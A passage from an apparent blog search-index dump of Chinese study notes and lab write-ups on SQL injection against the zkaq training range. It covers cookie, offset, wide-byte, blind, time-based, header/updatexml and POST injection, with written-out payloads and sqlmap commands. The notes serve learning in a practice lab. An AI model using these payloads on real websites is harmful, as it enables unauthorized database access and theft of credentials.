实操的时候发现,看录播的时候没有注意细节,我是在原始画面上那个没有get传参的页面上输入cookie信息的,所以没有用,页面不会跳转,因为根本没有数据库查询语句,写了flag也不会被拼接进去进行查询的.只有在有get传参的时候,把get传参去掉,改用cookie才能测试出信息)进入到靶场,随便点击一个页面,进入)发现fet传参id=171))去点url里的传参后设置cookie传参,再次访问页面发现页面还是这个)再次把id改成172回车访问页面再次跳转了,说明是存在cookie注入的判断字段数 document.cookie=&quot;ID=&quot;+escape(&quot;105 order by 26&quot;)这边order by 26页面返回正常,27返回错误,说明有26个字段 判断注入点 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin&quot;)页面返回三个注入点.但是呢,其实还有一个隐藏的注入点是没有发现的.右击靶场中那张没有加载出来的字段,检查元素会发现还有一个25是输出点判断表中字段数 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10,admin.* from admin&quot;)一个一个的删除直到第十个的时候发现页面返回正常了,说明admin中有十六个字段.为啥不返回数据呢?因为注入点是3,5,7,现在是11-26 根据注入点爆出值 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,admin.*,27 from admin&quot;)可以看到flag就在admin表中的最后一个字段的值 zkaq{f0e12dafb6} 总结 access的魅力就在于不知道字段名但是可以得到数据 如果输出点很少,偏移注入不能把所有的字段值爆破出来.就像这里的3,5,7,25是输出点,怎样偏移都没有办吧把中的字段的数据弄出来","path":"2020/04/05/access注入-zkaq靶场2/","date":"04-05","excerpt":"","tags":[{"name":"Access注入--偏移注入","slug":"Access注入-偏移注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"}]},{"title":"zkaq--正则表达式--zkaq靶场","text":"源码 )很明显就是考察正则表达式的./zkaq.*key.{2,9}:\\/.*\\/(key*key)/i第一次大致的解读就是zkaq任意字符key任意字符(长度2-9):/任意字符/key任意字符key 并且不区分大小写,直接正确了zkaq2key66://keykey 总结 其实自己对{}这个限定符的理解还不是很到位,{}限定的还是直接相关的前面的一个字,只有把前面内容用括号括起来才会要求所有内容全部重复 对.这个通配符,,单独使用.去匹配时只要不全都是制表符就会匹配成功,以前以为 如:a.就只能匹配两个字符,其实不然,其实他的意思是a后面第一个字符可以为不是制表符的任意字符(且必须有一个字符) .*就表示任意字符,且出现次数为0-n次 拓展","path":"2020/04/05/zkaq-正则表达式-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"http://wxnsoul.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"解决tags和categories点击后页面为空的问题","text":")标签页设置了下拉单,最大数量为三,点击之后也可以跳转到相应的标签分类.但是点击省略号之后跳出的内容却为空就像这样.查阅了很多资料之后终于找到原因了,原来是source/tags/index.md里面没有进行设施.在多加一行layout: &quot;tags&quot;之后就可以成功的跳转了 效果图: 原文地址:https://blog.csdn.net/winter_chen001/article/details/79719154","path":"2020/04/05/解决tags和categories点击后页面为空的问题/","date":"04-05","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"access注入--zkaq靶场","text":"判断是否存在cookie注入 实操的时候发现,看录播的时候没有注意细节,我是在原始画面上那个没有get传参的页面上输入cookie信息的,所以没有用,页面不会跳转,因为根本没有数据库查询语句,写了flag也不会被拼接进去进行查询的.只有在有get传参的时候,把get传参去掉,改用cookie才能测试出信息)进入到靶场,随便点击一个页面,进入)发现fet传参id=171))去点url里的传参后设置cookie传参,再次访问页面发现页面还是这个)再次把id改成172回车访问页面再次跳转了,说明是存在cookie注入的判断字段数 document.cookie=&quot;id=&quot;+escape(&quot;171 order by 11&quot;)此时页面才错误,说明有十个字段 判断注入点 access与mysql不同之处就在于这,必须要加个from table_name不然无法执行document.cookie=&quot;id=&quot;+escape(&quot;171 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;)找到注入点为2,3 猜值 document.cookie=&quot;id=&quot;+escape(&quot;171 union select 1,2,password ,4,5,6,7,8,9,10 from admin&quot;)因为access只有一个库,也没有什么自带库,,只能靠猜表,猜字段来作题,下节课可以教使用偏移注入来猜字段,这里的passord字段是风哥直接告诉我们的,不用纠结,不告诉也只能靠猜跑出来有点奇怪.. b9a2a2b5dffb918c)后来问了风哥才知道要去md5解密一下,解密出来是welcome.一开始死活解密不出是因为自己少抄了一个,,,md5只能加密成16或32位的(Md5加密后的特点) 进入后台 拿到了admin用户的密码后,按照提示进入后台,拿到flag)","path":"2020/04/04/access注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"Access注入--cookie注入","slug":"Access注入-cookie注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/"}]},{"title":"数据库注入--Access注入","text":"前言 数据库有很多Mysql Access MSSQL Oracle不同的数据库，虽然语句类似但是在渗透测试的时候是不同。本章研究不同数据库的注入方法还有一-些骚姿势 cookie注入简介 Cookie他并不安全,没有绝对的安全用户的体验性和安全是需要平衡,如果高度安全每访问一个页面最后登陆一-次,那么用户的体验肯定是很差的.所以就出现了cookie来记录用户身份提高用户体验Cookie注入核心在于注入方式,不是说只有access数据库才有cookie注入,只不过一般来说access数据库都很有可能存在cookie注入,毕竟是2000的产品Php常用版本是5.2,所以一般$_REQYEST[ ]是可以接收cookie传参的(低于5.4就可以) 什么情况使用cookie注入? 当get,post注入被拦截时 cookie和session的关系 如果cookie代表你(用户)的身份信息,那么session代表着警察局(服务器)内存储你的信息的地方 怎样修改cookie 通过burp抓包注意需要全部转化成url编码再放包 通过浏览器设置Application这里可以直接添加,也不需要转url码 通过控制台设置) 如何判断是否存在cookie注入 在有get传参的地方,比如id=171,把参数去掉后,通过burp抓包后在cookie最后加上;再加上一个空格(一定要)然后再加上id=171,放过后发现依旧能够达到预期的页面,这就说明cookie信息也被拼接写入数据库了 再使用and 1=1,1=2之类的来判断是否存在注入,不过需要注意的是cookie传参值需要url编码http://www.3464.com/tools/StrToHex/JiaMi.asp这是在线编码网站(使用控制台cookie传参得时候一定要把url栏中得参数去掉,不然会先用url栏中得数据,从而不使用cookie的) 和其他数据库的不同点 Access 数据库只有一个数据库,所有的表都只能在同一个数据库内,所以判断表名只能强行猜………经验来说一般有admin,user,news,job等.不过也可以用sqlmap去跑,去试而且,就msyql找注入点用select 1,2,3,4这样即可,但是access就必须select 1,2,3,4 from table_name才可以执行 如何使用sqlmap跑cookie注入? PY -2 sqlmap. Py -u “http://59. 63. 200. 79: 8004/ shovnews. asp” –cookie “id=171”注意url这里没有传参的,是吧参数单独放到后面用双引号引起来,告诉SQLmap跑这个注入点 直接抓包 -r抓 偏移注入原理核心:纵然不知道字段名但还是可以获得数据不知道表名,,就要去爆破主要用到union all 此条联合查询语句,union all和union得区别就是union会删除查询到得结果集中相同得数据,而union all不会再利用union all它要求必须字段数要相同,所以可以来判断到底表中有几个字段如图所示,这样就能判断出test表中有三个字段.再改成select * from table_name就可以爆出字段 注意点union查询前后字段数必须匹配.如果前面得字段少,后面偏移注入得字段多事没有办法成功得,所以union前面得字段要尽可能多,起码比后面得多.有些时候在源码中可以找到一些隐蔽得注入点,这些就需要自己去发现了 流程 判断注入点 order by判断字段数 判断表名(只能爆破) 联合查询 获取表中列数(知道存在几列以及输出点) 开始偏移注入,获取表中的数据 拓展万一需要的字段字段值不在第一条,在后面要怎么办?这时候就需要多了解一些知识了.首先,select * from flag union select 1,2,3 order by 1问:这个默认的升序排序是只对union 以后的数据进行排序还是把结果集合在一起之后再排序?答:是结合在一起之后在排序的,加个desc 变成降序也一样.问:如何取出第N条数据?答:这就需要加一个top关键字了.top 1就是取出第1条数据,top 2就是取出前两条数据.取出的数据进行排序后在输出.所以可能会发送top 1,top 2,top 3..输出的页面是一样的,那是因为虽然取出的数据变多了,但是排在最前面的那条数据其实是没有变过的 靶场地址 cookie注入传送门:https://wxnsoul.github.io/2020/04/05/zkaq-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-zkaq%E9%9D%B6%E5%9C%BA/偏移注入传送门:https://wxnsoul.github.io/2020/04/05/access%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA2/","path":"2020/04/04/数据库注入-Access注入/","date":"04-04","excerpt":"","tags":[{"name":"数据库注入--Access注入原理","slug":"数据库注入-Access注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"}]},{"title":"宽字节注入--zkaq靶场","text":"源码审计 审计源码,发现对/’”\\做了过滤 preg_replace($pattern, $replacement, $string)pattern表示正则表达式或是其他规则,replacement表示需要替换的内容,string表示需要搜索的字符串 string preg_quote ( string $str [, string $delimiter = NULL ] )preg_quote — 转义正则表达式字符正则表达式字符有这些: . \\ + * ? [ ^ ] $ ( ) { } = ! &lt; &gt; | : - 注意 / 不是正则表达式特殊字符。如果指定了可选参数 delimiter，它也会被转义.远么审计结果发现这句话表示数据库编码方式是GBK编码,可以尝试宽字节注入 尝试SQL注入 宽字节注入确实有效果,足足页面等了十五秒.. 判断字段数 1%df’ order by 4– qwe使用order by直到第四个失败,所以总共有三个字段1%df’ union select 1,2,3– wer 判断注入点 很明显2,3是注入点 查找表 查找字段 查到值 遇见的问题 在写table_name=’china_flag’的时候出错了,因为单引号被过滤了,自己潜意识里认为只需要绕过把变量引起来的单引号就可以了.那么这样子怎么办呢?我们可以有两种绕过方法使用子查询绕过(也可以使用十六进制) pass-17 post传参 这道题的区别就在于get传参变成了post传参,然后也关闭了回显,得用post类型的布尔盲注.Get传参和post的传参对这题的影响:url传参参数会进行url编码,但是post传参不会,必须自己手动通过burp改才行 两种解法 通过burp把参数改成十六进制 直接输入一个汉字来和magic_quotes_gpc产生的/闭合,url编码中一个汉字占三个字节,在数据库中和/结合后变成四字节就是两个中文了从而实现绕过 判断字段数 第四个的时候不行了,判断出是三个字段 判断表长 很明显长为10 爆破表名 表为china_flag 查找字段长 )这边又忘了单引号绕过,使用十六进制绕过表名 爆字段 跑出是C_flag 爆值 长11,最后跑出是zKaQ-Kzj+mz 总的来说宽字节注入也不难,搞懂原理后和前面都一样","path":"2020/04/04/宽字节注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入--宽字节注入","text":"magic_quotes_gpc魔术引号 $sql = ‘ select* from admin where username=&#39;‘.$REQUEST [ ‘ username’] .’&#39; and password =&#39;‘.$REQUEST [ ‘ password’ ]这是一个标准的sql语句,没有做过任何过滤所以使用万能密码很容易实现注入,使用魔术引号之后呢,就会自动在单引号,双引号,反斜杠之前自动加一个反斜杠(PHP5.4以后就取消了这个功能,可以在php.ini中查看是否开启)单引号和双引号内的一切都是字符串，那我们输入的东西如果不能闭合掉单引号和双引号，我们的输入就不会当作代码执行，就无法产生SQL注入，那我们该怎么办? 示例 )5.4以下的php中的php.ini文件中默认打开这个功能,此时要是传入’”/就i会发生这样的事情 GBK编码格式 Gbk编译的汉字占用两个字节,但是utf-8编译的汉字占用三个字节什么是url编码?其实就是十六进制编码,会把输入的十六进制转换成十进制然后对应ASCII码输出.比如%27转换成十进制就是39,对应的ascii就是单引号 宽字节注入原理 魔术引号把用户输入的单引号变成\\’之后,如果数据库编码不是utf-8编码就可能造成宽字节注入.因为\\的url编码是%5c,是占用一个字节的,如果用户输入%df’就会变成%df%5c从而组成一个双字节汉字’運’从而是的魔术引号加的/失效注意,只有get传参和cookie传参的时候在地址栏输入的参数才会被url编码,如果是post传参,基本上不可能被url编码先编译.所以如果是post传参,可以使用burp抓包后修改十六进制文件,或者是直接在表单中输入 汉’,也可以成功.因为utf-8编码中中文是三个字节的,加上’就是四个字节,到了GBK的数据库中就会变成两个中文字符如果使用sqlmap去跑,需要手动去闭合一些东西后再加*,毕竟是工具,比较呆示例:加了%df之后多出的β就会和/一起再数据库中组成一个汉字,从而实现了绕过 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/04/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-宽字节注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入绕过姿势","text":"#被过滤 使用%23绕过 单引号过滤 宽字节绕过 转十六进制 写子查询","path":"2020/04/04/SQL注入绕过姿势/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入绕过姿势","slug":"SQL注入绕过姿势","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"}]},{"title":"盲注--zkaq靶场","text":"因为关闭了回显,只能看页面返回是否正常,所以使用盲注来完成 测试是否可以注入 可以得知是可以进行注入的判断表的长度 1 and length((select table_name from information_schema.tables where table_schema=database()))&gt;0表长为6 爆破表名 1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97)使用burp跑包得出表为loflag 判断字段长 得知flag长度为8,在跑包得出所以flagBurp跑出密码为zKaQ-QQQ, zKaQ-RD, zKaQ-Moren, zKaQ-time-hj其实很早就拿到flag了,问了很多人之后才明白靶场里的flag提交的时候手打过不了,,,我是在QQ里打字之后复制粘贴过去才过的 另外两题也没什么大区别,只不过一个#被吃掉了,转义成%23即可,一个改成了get传参.不过get传参那题有个坑,flag被改了位置,峰哥说是为了培养我们思维不固化 关于注释符 1.# 2.– qwe 3.–+,有时候#会变成锚点,所以不得不改变注释符,但是–qwe只能在get注入里面使用,有局限性 sqlmap解题 也可以使用sqlmap去跑库,–flush-session语句用来清除缓存","path":"2020/04/04/盲注-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入--盲注","text":"为何要使用盲注 盲注主要是因为管理员关闭了回显,你无法得知返回得报错,所以只能通过盲注来实现注入攻击 常用函数 strlen(),substr(str,pos,len),acsii(),sleep(),if(flag?true:false) 主要流程select * from table_name where id=1 and 1=1页面正常返回select * from table_name where id=1 and 1=2页面错误返回所以开始利用这个页面返回是否正常来完成注入 select * from table_name where id=1 and length(database())&gt;5 开始根据页面返回来判断数据库字符长度,然后疯狂改变5测出真实长度 select * from table_name where id=1 and acsii(substr(database(),1,1))=111然后就是配合截取函数和acscii函数一个一个的判断字符.这可以使用burp功能模块来帮助快速完成,或者是sqlmap.不然如果太长手工破解会很累 select * from table_name where id=1 and length(select table_name from database())=5测试第一个表名的长度… select * from table_name where id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1))&gt;97然后就是一个一个的判断表名 以此类推…. 靶场实战 传送地址: 延时注入延时注入也是盲注的一种,只不过又换了两个函数利用,变成了if和sleep.举个小小的栗子,select * from table_name where id=1 and if(length(database())&lt;11,sleep(5),1) -- wqed&quot;如果数据库名&lt;11就沉睡5秒 注入优先级显错注入&gt;报错(updatexml(0x7e,sql,1))&gt;布尔盲注&gt;延时注入","path":"2020/04/04/SQL注入-盲注/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"HEAD注入--zkaq靶场","text":"源码 很明显,获取了请求头中的内容然后进行了insert操作.满足头注入的要求.进行头注入的时候需要正确的账号密码,渗透测试的时候去注册一个即可,这靶场里面的话则需要去爆破了. burp过滤出自己想要的内容 如果页面返回正常和不正常都差不多,那么可以设置过滤条件来帮助查看在option选择项里把默认的内容删除了,然后点击add添加自己想要的内容,如果页面返回的内容中匹配到了改内容就会在结果栏中打上勾(注意要用页面正常和不正常之间不同的内容来过滤,尽量使用避免中文)看,add上传成功后特有的字符串之后匹配到会打上勾.这边就爆破出靶场的账号密码是admin,123456 判断是否可以头注入 从这句与数据库进行交互的sql语言可以尝试构造sql注入,千万要注意闭合的细节!!!&#39; or sleep(5),1)#返回页面确实延迟了五秒多,说明是存在head注入的.这边遇见一个奇怪的点,我室友burp改user_agent自然是没有问题的,但是使用hackbar插件修改请求头之后却没有反应,再次尝试使用插件修改抓包后发现请求头确实被修改了但是post传的两个参数却没有了 使用xmlupdate函数爆破表名 ‘ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)# 这里需要注意表名是flag_head,~是concat函数连接上去的 爆破字段 ‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag_head’ limit 1,1)),1),1)# 爆破值 ‘ or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#成功得出flag 另外两个靶场也是差不多的这个是获取referer的这个是获取X-Forwarded=For的基本结构,直接修改就好","path":"2020/04/04/HEAD注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--HEAD注入","text":"HEAD注入介绍 函数介绍 0x表示16进制,7e表示的是~这个特殊符号,出现在了路径中所以会报错 实操 select * from user where ID= 1 and updatexml(1,concat(0x7e,(select database())),1)注意,只是返回一行数据,需要用limit去操作返回哪一行 为何要HEAD注入 有的数据库管理员会关闭报错,关闭掉数据库所有报错之后肯定是不会成功的,但是一般不会有管理人员回去关闭掉所有报错,就比如说insert插入操作.但是insert操作不会有回显,所以我们需要让她去强行报错.会什么浏览器会返回我们报错的数据呢?因为php处理MySQL时遇见了致命性错误会告诉用户出错了 X-Forwarded-For 用于获取你的真实ip,如果你用了透明代理,传输上去的数据包里会有X-Forwarded_For函数来告诉服务器你得ip,当然这个我们可以通过拦截来修改 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-HEAD注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"}]},{"title":"POST注入--zkaq靶场","text":"靶场地址:https://hack.zkaq.cn/ )题目长这样,尝试使用万能密码很明显成功登录了,接下来就可以查询了 首先查字段数select *from user where username =&#39;1&#39; or 1=1 order by 3#&#39; and password=&#39;&#39;select *from user where username =&#39;&#39; or 1=1 order by 4#&#39; and password=&#39;&#39;可以得知有三个字段 接着找出注入点select *from user where username =&#39;&#39; union select 1,2,3#&#39; and password=&#39;&#39;可以看出2,3是注入点 爆表(爆不爆库无所谓,直接拿database()代替就可以)select *from user where username =&#39;&#39; union select 1,2,table_name from information_schema.tables where table_schema=database()#&#39; and password=&#39;&#39;查找出flag表 爆字段select *from user where username =&#39;&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#&#39; and password=&#39;&#39;看到是flag字段 查值select *from user where username =&#39;&#39; union select 1,2,group_concat(flag) from flag#&#39; and password=&#39;&#39;可以爆出字段值注:尽量使用limit一个一个取值而不要group_concat,因为只能输出一行,有时候数据会出书不完整 另外一个靶场也只需要注意闭合的问题,流程一样 利用sqlmap工具先使用burp抓住带有cookie信息的包,然后复制粘贴到txt文件里,把需要注入的点改成星号*,告诉sqlmap这里是注入点,然后使用-r打开文件就行,这里依旧需要使用—dbs等命令来暴库,一开始以为不需要python sqlmap.py -r 1.txt --dbs --level 3(默认的level是力度不够的) python sqlmap.py -r 1.txt -D error --tables --level 3python sqlmap.py -r 1.txt -D error -T error_flag --columns --level 3python sqlmap.py -r 1.txt -D error -T error_flag -C flag --dump --level 3","path":"2020/04/04/POST注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--POST注入","text":"SQL注入原理分析 注入攻击的本质:是把用户输入的数据当作代码执行（注入攻击不单指SQl注入）SQL注入点：可以进行SQL注入的地方要能够进行注入攻击必须满足两个条件:1.用户必须可以控制数据的输入2.用户输入的数据能够当作代码执行如果用户输入的数据被强制转换成了数字,那么就失去了这个条件 post传参 post注入和get注入并没有多大的区别,只是传参方式变了而已.get是在url里面传参,post是在各种框框之中,比如说登录框,查询框,各种和数据库有交互的框之中 万能密码 因为用户登录的时候一般要输入用户名和密码,所以想象一下数据库查询语句可能是select * from table where user=&#39;$user&#39; and pwd=&#39;$pwd&#39;这里就可以通过闭合单引号来实现万能密码.select * from table where user=&#39;&#39;1 or 1=1#&#39; and pwd=&#39;$pwd&#39;这样or 1=1恒成立,用户名不填也没事,而密码已经被注释掉了,填什么也无所谓.这样就变成了一个恒为真的万能密码,就可以再配合order by,limit,select等开始报库 靶场实战 zkaq–writeup:https://wxnsoul.github.io/2020/04/04/POST%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-POST注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"}]},{"title":"Get注入--zkaq靶场","text":"一段时间没做确实生疏了0.0代码都忘了一部分,最主要的还是会忘记Mysql数据库自带的那几个库名.table_schema,information_schema.tables,information_schema.columns靶场链接:https://hack.zkaq.cn/一上来就可以看出这是get注入,因为在url里面传参id 在后面尝试加入and 1=1 ,or 1=1,and1=2之类的判断select *from user where id=1 and 1=1页面正常返回,在尝试输入select *from user where id=1 and 1=2页面返回错误,这说明就是把用户输入的数据当作代码执行了 再使用order by测试出字段数select *from user where id=1 order by 4)一直到order by 4的时候页面返回错误,所以可以判断出只有三个字段 使用连接查询来判断注入点select *from user where id=1 union select 1,2,3可以得知2,3是注入点 在注入点处替换数据库查询语句,首先爆数据库select *from user where id=1 union select 1,2,database()可以看到数据库名是error 接着爆表select *from user where id=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;error&#39; limit 1,1可以得出表名是error_flag 接着爆字段select *from user where id=1 union select 1,2,column_name from information_schema.columns where table_name=&#39;error_flag&#39; limit 2,1 这个表中一共三个字段,如果不使用limit的话会直接返回最后一个字段.我们可以得出字段是flag 最后爆值select *from user where id=1 union select 1,2,group_concat(flag) from error_flag成功得出flag 总的来说流程就是这样的,剩下两个get注入的靶场也都只要注意下闭合就行,很简单个人打算学完zkaq之后去刷ctf题目,那边的难一点适合提升,有各种过滤,需要去绕过","path":"2020/04/03/Get注入-zkaq靶场/","date":"04-03","excerpt":"","tags":[{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--原理分析以及Get注入","text":"SQL注入原理分析 注入攻击的本质:是把用户输入的数据当作代码执行（注入攻击不单指SQl注入）SQL注入点：可以进行SQL注入的地方要能够进行注入攻击必须满足两个条件:1.用户必须可以控制数据的输入2.用户输入的数据能够当作代码执行如果用户输入的数据被强制转换成了数字,那么就失去了这个条件 显错注入的基本流程 代码流程 使用 and 1=1,or 1=1,sleep等来判断是否可以注入(会不会被当作代码执行,注意闭合) 使用order by判断出字段数 使用select 1,2..开始判断注入点 改变id值使其出错来使得页面有回显或者使用limit 来控制输出条数 select 1,table_name from information_schema.tables where table_schema=database() select 1,column_name from information_schema.columns where table_name = select 1,column_name from table_name limit 0,1 具体实操直接看靶场的write uphttps://wxnsoul.github.io/2020/04/03/Get%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/03/SQL注入-原理分析以及Get注入/","date":"04-03","excerpt":"","tags":[{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"}]},{"title":"zkaq--web安全前端基础","text":"学习编程的意义 黑盒测试:无源码白盒测试:有源码(就比如后面的代码审计模块)记住一句话，我们是学习渗透测试的!不是学习开发的!开发的核心在于写代码渗透测试人员的核心在于看代码[写工具另类]如何学习编程? 1.-定要自己动手2.基础语法逻辑很重要3.不知道如何学习的可以看看菜鸟教程或者W3C这串红色的话真的是克服了我对他的恐惧,以前总是觉得很困难! 前端 HTML基础 )浏览器部分的源码我们可以随意修改,但是刷新时候又变回去了.因为服务器端的数据并没有被修改,就比如:因为浏览器是在我们本地的,所以可以直接修改数据,但是修改不到服务器端的数据 JS学习 Jscript是大大的拓展了前端页面和用户交互的功能，Ｊｓ其实核心就是操作你得浏览器去做其他规定的事情，很明显JS可以操纵你得浏览器，这是一个很危险的事情，所以说如果你执行了恶意的Ｊｓ代码会影响你电脑的安全性可以在设置中禁用ｊｓ有时就会出现漏洞","path":"2020/04/03/zkaq-web安全前端基础/","date":"04-03","excerpt":"","tags":[{"name":"web前端安全基础","slug":"web前端安全基础","permalink":"http://wxnsoul.github.io/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}]},{"title":"web服务通信原理","text":"zkaq的课程基本学的差不多了,到这里的时候基本还剩一丢丢部分还没有学习了,waf放入绕过和实战讲解.我不想过于着急去看实战了,毕竟基础不好的话看了等于浪费,于是打算把前面的知识点都复习回顾一边 基本常识 ip就是指地址,ip又分为公网地址和内网地址.比如说自己虚拟机里的ipv4地址,本机的ipv4地址,就是内网地址.比如你家的门牌号那就是个公网地址，X省X市X街道X号，别人看到这个地址就能找到你家内网地址是什么妮，假设你住的是-一个大楼，比如住401房间，那么只有同一个大楼里面的人才能够通过401这个地址找到你的房间吧。其他人根本不知道是哪里的401房间对吧 所以说公网比内网要更加精确,他能直接找到你在哪.内网只是在知道你在哪后继续划分你在这里的具体哪里.前面说到了路由器是划分内网地址的,所以自己本机里的IP地址千万不要以为是公网地址.那么如何查看自己的公网地址呢?直接百度搜索ip就可以了. C段 前面三个值相同,最后一个事0-255就是c段如:114.114.114.0和114.114.114.255 域名 实际上是为了方便记忆所发明的一个字符串标识DNS:讲域名转化为ip的一个协议(对应内容找相应的服务器)因为让你直接去记一个公网ip,去访问,肯定是比较费脑子的.但是你使用域名代替之后,比如www.baidu.com就会很方便的记住了域名等级:有几个点间隔就是几级,联系是二级域名是依附在顶级域名之上的,顶级域名可以扶持N个二级域名 DNS 上面访问域名为什么会访问到对应的ip呢?这就是因为DNS解析协议了.它就是把域名转化成对应的ip地址,然后去访问相应的服务器. 端口 端口是什么呀?端口就像电脑的接口，像USB接口，比如你需要用键盘时候，你要把键盘插入接口，端口就是类似的东西，端口主要是网络接口，比如你去访问别人网站，一般来说你实际上是去他的80端口进行通信。我们有多少个端口妮?有范围是从0到65535 (2^16-1)0端口是预留端口。一般不会用到 cookie(不安全) 是服务器给你的代表你身份的一串字符串.为了提升用户体验的,但是越便捷的东西越不安全 web容器 是可以向发出请求的浏览器提供文档的程序(其实我们访问IP时访问到的就是web容器)(是一个被动的程序)常见的web容器:IIS(WINDOWS)Apache(全平台)Nginx(全平台)Tomcat 动态语言 定义:是对服务器行为的编程,这被称为服务器脚本或服务器端脚本作用: 动态地向web页面编辑、改变或添加任何的内容 对由HTML表单提交的用户请求或数据进行响应 访问数据或数据库，并向浏览器返回结果 为不同的用户定制页面 提高网页安全性，使您的网页代码不会通过浏览器被查看到常见的服务器脚本: 搭建一个网站 安装web容器(Apache) 安装静态语言(PHP) 安装数据库(Mysql)嫌弃麻烦,所以有人出了集成,如宝塔,phpstudy(php5.4.45+Apache用的比较多) 其中index.php是默认的根目录 动手搭建实践碰到的问题 重新回顾视频得时候发现原来可以通过主机来访问虚拟机得IP地址,但是ping虚拟机却一直不能成功,原因是没有关闭虚拟机里的两个防火墙 勾取允许目录列表之后却不能访问到目录,原因是没有把l.php给删掉.(l.php就是探针,更目录下的默认访问页面,就像打开phpmyadmin一样index是默认页面)在conf里面得vhost可以改配置文件 增加新的站点时尝试过多次后发现,根目录不可以用于网页地址,如单单的一个E:,或者C: 后期发现sql服务会占用8080端口,所以自己不在本机装phpstudy了,关闭服务都嫌弃麻烦","path":"2020/04/03/web服务通信原理/","date":"04-03","excerpt":"","tags":[{"name":"web通信原理","slug":"web通信原理","permalink":"http://wxnsoul.github.io/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"}]},{"title":"SQL语句--空值及其处理","text":"什么是空值 空值从技术上来说就是“未知的值”。但空值并不包括零、一个或者多个空格组成的字符串、以及零长度的字符串. 检测空值 